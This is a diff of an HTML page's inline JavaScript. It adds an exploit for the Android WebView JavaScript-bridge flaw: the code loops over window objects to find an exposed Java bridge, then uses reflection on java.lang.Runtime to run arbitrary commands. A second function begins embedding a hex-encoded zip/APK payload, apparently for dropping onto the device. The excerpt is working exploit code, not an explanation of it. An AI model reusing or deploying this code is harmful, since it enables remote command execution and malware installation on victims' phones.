@@ -33,10 +33,16 @@
 <link href='http://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
 -->
 <script>
-function execute(cmdArgs) 
-{ 
-return js2java.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); 
-}  
+function execute(cmdArgs)
+{
+&nbsp; &nbsp; for (var obj in window) {
+&nbsp; &nbsp; &nbsp; &nbsp; if ("getClass" in window[obj]) {
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; alert(obj);
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return &nbsp;window[obj].getClass().forName("java.lang.Runtime")
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+&nbsp; &nbsp; &nbsp; &nbsp; }
+&nbsp; &nbsp; }
+}&nbsp;
 
 function myfunction(){
 var armBinary1 = "\\x50\\x4B\\x03\\x04\\x14\\x00\\x08\\x00\\x08\\x00\\x51\\x8F\\xCA\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x13\\x00\\x04\\x00\\x72\\x65\\x73\\x2F\\x6C\\x61\\x79\\x6F\\x75\\x74\\x2F\\x6D\\x61\\x69\\x6E\\x2E\\x78\\x6D\\x6C\\xFE\\xCA\\x00\\x00\\xAD\\x52\\x31\\x6F\\xD3\\x40\\x18\\xFD\\x2E\\x76\\xAE\\x86\\xC4\\x69\\x5A\\x3A\\x54\\xA2\\x12\\xA9\\xC4"
